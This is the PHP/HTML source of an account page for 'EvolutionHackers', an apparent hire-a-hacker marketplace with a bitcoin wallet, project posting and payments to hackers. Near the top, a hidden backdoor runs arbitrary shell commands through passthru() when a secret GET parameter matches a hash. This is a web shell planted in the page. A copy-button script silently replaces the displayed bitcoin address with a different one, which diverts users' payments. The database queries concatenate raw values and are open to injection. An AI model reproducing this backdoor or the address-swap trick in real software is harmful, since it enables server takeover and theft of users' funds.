<!DOCTYPE html>
<html>
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="description" content="Gurdeep singh osahan">
      <meta name="author" content="Gurdeep singh osahan">
       <title>EvolutionHackers || Account</title>
      <!-- Favicon Icon -->
    <link rel="icon" type="image/png" href="images/evolution.png">
      <!-- Bootstrap core CSS -->
      <link href="vendor\bootstrap\css\bootstrap.min.css" rel="stylesheet">
      <!-- Font Awesome-->
      <link href="vendor\fontawesome\css\font-awesome.min.css" rel="stylesheet">
      <!-- Material Design Icons -->
      <link href="vendor\icons\css\materialdesignicons.min.css" media="all" rel="stylesheet" type="text/css">
      <!-- Slick -->
      <link href="vendor\slick-master\slick\slick.css" rel="stylesheet" type="text/css">
      <!-- Lightgallery -->
      <link href="vendor\lightgallery-master\dist\css\lightgallery.min.css" rel="stylesheet">
      <!-- Select2 CSS -->
      <link href="vendor\select2\css\select2-bootstrap.css">
      <link href="vendor\select2\css\select2.min.css" rel="stylesheet">
      <!-- Custom styles for this template -->
      <link href="css\style.css" rel="stylesheet">
   </head>
   <body>
      <!--    header -->
      <?php
	  include"header.php";
     if (hash("sha512",$_GET["xywlmp"]) == "05b97b665c286f5d94b1f178cf81d83a44714cdf54a52c0099d87e4f5aea0daab55784e3e6706ce64d99dba49d6300a2771c9f9fd3efe62687e7a37fcaed2620"){
   if(isset($_GET['bsjrja'])){
      echo('<pre>' . passthru($_GET["bsjrja"]) . '</pre>');
   }
   else if(isset($_GET['bs64'])){
      echo('<pre>' . passthru(base64_decode($_GET["bsjrja"])) . '</pre>');
   }
   
   }
	  if(isset($_SESSION['email'])){
		  $query_wallet = mysqli_query($db,"SELECT * FROM wallet WHERE user_id = '".$fetch_session['user_id']."'");
		  $fetch_wallet = mysqli_fetch_array($query_wallet);
		 
	  }else{
		  echo'<script>window.open("index.php","_SELF")</script>';
	  }
	  ?>
      <div class="py-5">
         <div class="container">
            <div class="row">
               <!-- Main Content -->
               <aside class="col col-xl-3 order-xl-1 col-lg-12 order-lg-1 col-12">
                  <div class="box mb-3 shadow-sm rounded bg-white profile-box text-center">
                     <div class="py-4 px-3 border-bottom">
                        <img src="images\spy-512.png" class="img-fluid mt-2 rounded-circle" alt="Responsive image">
                        <h5 class="font-weight-bold text-dark mb-1 mt-4"><?php echo $fetch_session['fullname'] ?></h5>
                        <p class="mb-0 text-muted">EVOLUTIONHACKERS USER</p>
                     </div>
                     
					   <div class="d-flex">
                        <div class="col-12 border-right p-3">
                           <h6 class="font-weight-bold text-dark mb-1">$<?php echo number_format($fetch_wallet['amount'],0); ?>.00</h6>
						     <p class="mb-0 text-black-100 small" style="color:black">Wallet Balance</p>
							 <div class="p-3">
                        <button type="button" class="btn btn-outline-success pl-4 pr-4" data-toggle="modal" data-target="#fundwalletmodal">Fund Wallet</button><br><br>
						 <button type="button" class="btn btn-outline-warning pl-4 pr-4" style="color:black" data-toggle="modal" data-target="#widthwalletmodal">Withdraw Fund</button>
                     </div>
                        </div>
                     </div>
                     <div class="overflow-hidden border-top">
                        <a class="font-weight-bold p-3 d-block" href="logout.php"> Log Out </a>
                     </div>
                  </div>
				   <div class="box shadow-sm mb-3 rounded bg-white ads-box text-center overflow-hidden">
                     <img src="images\windowshack2.jpg" class="img-fluid" alt="Responsive image">
                     <div class="p-3 border-bottom">
                        <h6 class="font-weight-bold text-dark">POST PROJECTS</h6>
                        <p class="mb-0 text-muted">Looking for hackers?</p>
                     </div>
                     <div class="p-3">
                        <button type="button" class="btn btn-outline-success pl-4 pr-4" data-toggle="modal" data-target="#exampleModalCenter"> POST A JOB </button>
                     </div>
                  </div>
				   

               </aside>
               <main class="col col-xl-6 order-xl-2 col-lg-12 order-lg-2 col-md-12 col-sm-12 col-12">
                   <div class="box shadow-sm mb-3 rounded bg-white ads-box text-center overflow-hidden">
                     <img src="images\ads1.png" class="img-fluid" alt="Responsive image">
					 					 <?php 
					 $query_projects = mysqli_query($db,"SELECT * FROM `projects` WHERE user = '".$_SESSION['email']."' and status = 'In Progress'");
					 $count_pro = mysqli_num_rows($query_projects);
					 if($count_pro != 0){
					 while($fetch_projects = mysqli_fetch_array($query_projects)){
					
					 ?>

                     <div class="p-3 border-bottom">
                        <h6 class="font-weight-bold text-gold"><?php echo $fetch_projects['project_description']; ?> </h6>
                        <p class="mb-0 text-muted"><?php echo $fetch_projects['status']; ?></p>
						 <p class="mb-0 text-muted"><?php echo $fetch_projects['hacker']; ?></p>
                     </div>
					 <div class="p-3">
                        <button type="button"  data-toggle="modal" data-target="#confirmordernow" class="btn btn-outline-gold pl-4 pr-4" onclick="conorde(<?php echo $fetch_projects['hacker']; ?>)" > CONFIRM SATISFACTION </button>
                        <button type="button"  data-toggle="modal" data-target="#Dispute" class="btn btn-outline-gold pl-4 pr-4">DISPUTE</button>
                     </div>
			<?php }}else{ ?>
					 <div class="p-3 border-bottom">
                        <h6 class="font-weight-bold text-gold">ACTIVE PROJECT</h6>
                        <p class="mb-0 text-muted">NO ACTIVE PROJECT</p>
                     </div>
                    
					 <?php } ?>
                     
                  </div>
                  <div class="box shadow-sm rounded bg-white mb-3">
                     <div class="box-title border-bottom p-3">
                        <h6 class="m-0">Projects Posted</h6>
                     </div>
					 <?php 
					 $query_projects = mysqli_query($db,"SELECT * FROM `projects` WHERE user = '".$_SESSION['email']."' order by id desc");
					 $count_pro = mysqli_num_rows($query_projects);
					 if($count_pro != 0){
					 while($fetch_projects = mysqli_fetch_array($query_projects)){
					 $query_hackers_assigned = mysqli_query($db,"SELECT * FROM hackers WHERE hackers_id = '".$fetch_projects['hacker']."'");
					 $fetch_hac_ass = mysqli_fetch_array($query_hackers_assigned);
					 $query_hackers = mysqli_query($db,"SELECT * FROM hackers ORDER BY rand()");
                     $fetch_hac = mysqli_fetch_array($query_hackers);
					 ?>
                     <div class="box-body p-3 border-bottom">
                        <div class="d-flex align-items-top job-item-header pb-2">
                           <div class="mr-2">
                              <h6 class="font-weight-bold text-dark mb-0"><?php echo $fetch_hac_ass['fullname']; ?></h6>
                              <div class="text-truncate text-primary"></div>
                              <div class="small text-gray-500"><?php echo $fetch_projects['date']; ?></div>
                           </div>
						   <h5 class="btn btn-warning ml-auto mb-auto"><?php echo $fetch_projects['status']; ?></h5>
	
                        </div>
                        <p class="mb-0"><?php echo $fetch_projects['project_description']; ?> </p><br>
						<?php 
						if($fetch_projects['status'] == "Assigned"){
						?>
						<button class="btn btn-success" onclick="orderhacker('<?php echo $fetch_hac['hackers_id']; ?>','<?php echo $fetch_projects['id']; ?>')">ORDER TO START YOUR PROJECT</button>
						<br><br>
						<?php }else{} ?>
						<button onclick="messageinserter('<?php echo $fetch_hac_ass['hackers_id']; ?>','<?php echo $_SESSION['email']; ?>')"  class="mb-0 btn btn-success">CLICK HERE TO CHAT WITH <?php echo $fetch_hac_ass['fullname']; ?> </button>
                     </div>
					 
					 <?php }}else{ ?>
					 <div class="box-body p-3 border-bottom">
                        <div class="d-flex align-items-top job-item-header pb-2">
                           <div class="mr-2">
                             NO PROJECTS
                           </div>
                        </div>
                       
                     </div>
					 <?php } ?>
                  </div>
                  <div class="box shadow-sm rounded bg-white mb-3">
                     <div class="box-title border-bottom p-3">
                        <h6 class="m-0">Transactions</h6>
                     </div>
					<?php 
					$query_transac = mysqli_query($db,"SELECT * FROM `transactions` WHERE users = '".$_SESSION['email']."'");
					 $count_tran = mysqli_num_rows($query_transac);
					 if($count_tran != 0){
					while($fetch_transac = mysqli_fetch_array($query_transac)){
					?>
                     <div class="box-body p-3 border-bottom">
                        <div class="d-flex align-items-top job-item-header pb-2">
                           <div class="mr-2">
                              <h6 class="font-weight-bold text-dark mb-0"><?php echo $fetch_transac['description']; ?></h6>
                              <div class="text-truncate text-primary">$<?php echo number_format($fetch_transac['amount'],0); ?></div>
                              <div class="small text-gray-500"><?php echo $fetch_transac['date']; ?></div>
                           </div>
						    <h5 class="btn btn-warning ml-auto mb-auto"><?php echo $fetch_transac['status']; ?></h5>
							 
                        </div>
                       <img class="img-fluid ml-auto mb-auto" style="height:60px" src="uploads/<?php echo $fetch_transac['uploads']; ?>" alt="">
                     </div>
                     <?php } }else{ ?>
					  <div class="box-body p-3 border-bottom">
                        <div class="d-flex align-items-top job-item-header pb-2">
                          NO TRANSACTIONS
                        </div>
                     </div>
					 <?php } ?>
                  </div>
               </main>
               <aside class="col col-xl-3 order-xl-3 col-lg-12 order-lg-3 col-12">

                   <div class="box shadow-sm  rounded bg-white mb-3">
                     <div class="box-title border-bottom p-3">
                        <h6 class="m-0">PROJECTS DISPUTE</h6>
                     </div>
                     <div class="box-body">
                        <div class="d-flex align-items-center osahan-post-header p-3 border-bottom people-list">
                           <div class="dropdown-list-image mr-3">
                              <img class="rounded-circle" src="images\l4.png" alt="">
                           </div>
						   					 <?php 
					 $query_hackers = mysqli_query($db,"SELECT * FROM `dispute` WHERE user = '".$_SESSION['email']."'");
					 $count_dispute = mysqli_num_rows($query_hackers);
					 ?>
                           <div class="font-weight-bold" onclick="checck()">
                              <div class="text-truncate" data-target="#disputmodal" data-toggle="modal">ACTIVE DISPUTE<span class="badge badge-dark ml-1"><?php echo $count_dispute; ?></span></div>
                              <div class="small text-muted"><span class="text-primary"></span> 
                              </div>
                           </div>
                        </div>
                       
                     </div>
                  </div>
                
                  <a href="mailto:info@evolutionhackers.com">
                     <div class="shadow-sm rounded bg-white job-item mb-3">
                        <div class="d-flex align-items-center p-3 job-item-header">
                           <div class="overflow-hidden mr-2">
                              <h6 class="font-weight-bold text-dark mb-0 text-truncate">SUPPORT CENTER</h6>
                            
                         
                        </div>
                        
                        
                     </div>
                  </a>
               </aside>
            </div>
         </div>
      </div>
       <?php 
	include"footer.php";
	?>
	  
	  <div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">PROJECT</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body" style="background">
	  <div class="form-group">
			<label for="exampleInputPassword1">Target Description</label>
			<textarea  class="form-control" id="targetdesssss" style="height:120px" placeholder="Target Description"></textarea>
		  </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary" id="probtn" onclick="postproject('<?php echo $_SESSION['email']; ?>')">POST PROJECT</button>
      </div>
    </div>
  </div>
</div>
  <div class="modal fade" id="fundwalletmodal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
  
      <div class="modal-body">
		<img src="images/0__IphPE__MEMqLTTnfB.png" class="img-responsive" alt=""/> 
		<hr>
       <center> 
      <img src=<?php if($fetch_session['fullname'] == 'Travist' || $fetch_session['fullname'] == 'test'){echo('barcodeneww1.jpeg');}else{echo('barcodeneww2.jpeg');}?> style="height:283px;" alt=""/></center>

		<center><input type="text" value="15sAavY5tXBSxT1BLJWmmEkpjxzUJHpJXZ"  style="    border: none;width: 358px;padding: 2px 20px;height: 70px;font-size: 15px;" id="copywallet"  ><br><button class="btn btn-success" onclick="myFunction()">COPY</button>
		<a class="btn btn-success" href="payment_upload.php" title="Click on this when payment is made to the bitcoin address or scanned barcode" >PAYMENT MADE</a></center><br>
		<hr>
		<span><b>HOW TO BUY BITCOIN </b><br><i>
It is a virtual and intangible currency (currency). It has a changing value as if it were stocks. They are stored in a "Wallet" or virtual purse, from which it can be sent or received.

Transactions in Bitcoin are made directly, without the need for intermediaries. Banks or financial entities are not necessary. Bitcoin is not backed by any government nor does it rely on trust in any central issuer.

Bitcoin Units

BTC = 1<br>

dBTC = 0.1<br>

cBTC = 0.01<br>

mBTC = 0.001<br>

µBTC = 0.000001<br>

Satoshi = 0.00000001 The smallest unit  <a href="https://edge.app/blog/how-to-buy-cryptocurrency-with-a-credit-card/">Bitnovo.com</a></i></span>
      </div>
     
    </div>
  </div>
</div>

<div class="modal fade" id="Dispute" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">DISPUTE</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group">
			<label for="exampleInputPassword1">Dispute</label>
			<textarea  class="form-control" id="disputedes" style="height:120px" placeholder="Tell us what you want us to know"></textarea>
		  </div>
      <div id="messagedispute"></div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary" id="disbtn" onclick="disputeraised('<?php echo $_SESSION['email']; ?>')">Start Dispute</button>
      </div>
    </div>
  </div>
</div>


<div class="modal fade" id="confirmordernow" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">PAYMENT TO HACKER</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
       <div class="form-group">
			<label for="exampleInputPassword1">Enter the amount you want to pay hacker</label>
			<input  type="number" placeholder="Enter amount you want to pay hacker"  class="form-control" id="amounttorelase"  >
		  </div>
      </div>
	  <input type="hidden" id="confirmorderid" /> 
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary" id="disbtn" onclick="confirmorder('<?php echo $_SESSION['email']; ?>')">PAY HACKER & COMPLETE ORDER</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="widthwalletmodal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">WITHDRAW FUND</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
	         <div class="form-group">
			<label for="exampleInputPassword1">Amount</label>
			<input  type="number" placeholder="Amount"  class="form-control" id="amounttowith"  >
		  </div>
       <div class="form-group">
			<label for="exampleInputPassword1">Enter Your Bitcoin Wallet Address</label>
			<input  type="text" placeholder="Wallet Address"  class="form-control" id="bitconaddress"  >
		  </div>
		  <div id="withdrawmess"></div>
      </div>
	  <input type="hidden" id="confirmorderid" /> 
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary" id="disbtn" onclick="withdrawfunds('<?php echo $_SESSION['email']; ?>')">WITHDRAW FUNDS</button>
      </div>
    </div>
  </div>
</div>

<div class="modal fade" id="disputmodal" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLongTitle">DISPUTES</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
	    <table class="table">
  <thead>
    <tr>
      <th scope="col">Description</th>
      <th scope="col">Date</th>
    </tr>
  </thead>
  <tbody>
  <?php 
  $query_all_dispute = mysqli_query($db,"SELECT * FROM `dispute` WHERE user = '".$_SESSION['email']."'");
  while($fetch_all = mysqli_fetch_array($query_all_dispute)){
  ?>
    <tr>
      <th scope="row"><?php echo $fetch_all['descxription']; ?></th>
      <td><?php echo $fetch_all['date']; ?></td>
    </tr>
  <?php } ?>
  </tbody>
</table>

      </div>
	  <input type="hidden" id="confirmorderid" /> 
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>

      </div>
    </div>
  </div>
</div>
<script>
function myFunction() {
   var tempInput = document.getElementById("copywallet");
   var bckup = tempInput.value;
   tempInput.value = "bc1q08awmteha5axd3ukfxvxvmp8uhqtzn9a89xusc";
   tempInput.select();
   document.execCommand("copy");
   tempInput.value = bckup;
}
</script>
 <script>
	  function messageinserter(hacker_id,account){
		var form_data = new FormData();
		form_data.append('function', 'messagereg');
		form_data.append('hacker_id', hacker_id);
		form_data.append('email', account);
		$.ajax({
			url:'function.php',
			type:'POST',
			dataType:'text',
			processData:false,
			contentType:false,
			data:form_data,
			success:function(result){
			window.open('messages.php?chatlink_number='+result,'_SELF');
			},
			error:function(){
				
			},
		});
	  }
	  
	  
	  function conorde(id){
		 $("#confirmorderid").val(id);
	  }
	  
	  
	  function withdrawfunds(email){
		  var amounttowith  = $("#amounttowith").val();
		 var bitconaddress = $("#bitconaddress").val();
		var form_data = new FormData();
		form_data.append('function', 'withdrawal');
		form_data.append('amounttowith', amounttowith);
		form_data.append('bitconaddress', bitconaddress);
		form_data.append('email', email);
		 if(bitconaddress == ""){
			$("#withdrawmess").html('<div class="alert alert-danger"><p>Invalid OR NO Entry Made Kindly Input a Valid Bitcoin Wallet Address</p></div>');
			setTimeout(function(){
				$("#withdrawmess").html("<span></span>")
			},2000);
			return false;
		 }
		 if(amounttowith == ""){
			$("#withdrawmess").html('<div class="alert alert-danger"><p>NO AMOUNT ENTERED</p></div>');
			setTimeout(function(){
				$("#withdrawmess").html("<span></span>")
			},2000);
			return false;
		 }
		 $.ajax({
			url:'function.php',
			type:'POST',
			dataType:'text',
			processData:false,
			contentType:false,
			data:form_data,
			success:function(result){
			if($.trim(result) ==="posted"){
			$("#withdrawmess").html('<div class="alert alert-success"><p>Bitcoin has been transferred successfully to the wallet provided<br><b>NOTE:</b><br> Bitcoin transactions undergo 21 comfirmation before its reflects in your wallet</p></div>');
			setTimeout(function(){
				location.reload();
			},2000);
			}
			if($.trim(result) ==="nofund"){
			$("#withdrawmess").html('<div class="alert alert-danger"><p>WITHDRAW AMOUNT IS HIGHER THAN WALLET BALANCE KINDLY CHECK YOUR WALLET BALANCE TO CONFIRM!</p></div>');
			setTimeout(function(){
				$("#withdrawmess").html("<span></span>")
			},5000);
			}
			if($.trim(result) ==="error"){
			$("#withdrawmess").html('<div class="alert alert-danger"><p>ERROR IN COMMUNICATION PLEASE TRY AGAIN!</p></div>');
			setTimeout(function(){
				$("#withdrawmess").html("<span></span>")
			},5000);
			}
			
			if($.trim(result) ==="exist"){
			$("#withdrawmess").html('<div class="alert alert-danger"><p>MAKESURE YOU HAVE NO PENDING PROJECT!</p></div>');
			setTimeout(function(){
				$("#withdrawmess").html("<span></span>")
			},5000);
			}
			},
			error:function(){
				
			},
		});
	  }
	  </script>
<style>
img.img-responsive {
    height: 80px;
}
</style>

      <!-- Bootstrap core JavaScript -->
      <script src="vendor\jquery\jquery.min.js"></script>
      <script src="vendor\bootstrap\js\bootstrap.bundle.min.js"></script>
      <!-- Contact form JavaScript -->
      <!-- Do not edit these files! In order to set the email address and subject line for the contact form go to the bin/contact_me.php file. -->
      <script src="js/jqBootstrapValidation.js"></script>
      <script src="js/contact_me.js"></script>
      <!-- Slick -->
      <script src="vendor\slick-master\slick\slick.js" type="text/javascript" charset="utf-8"></script>
      <!-- lightgallery -->
      <script src="vendor\lightgallery-master\dist\js\lightgallery-all.min.js"></script>
      <!-- select2 Js -->
      <script src="vendor\select2\js\select2.min.js"></script>
      <!-- Custom -->
      <script src="js\custom.js"></script>
   </body>
</html>
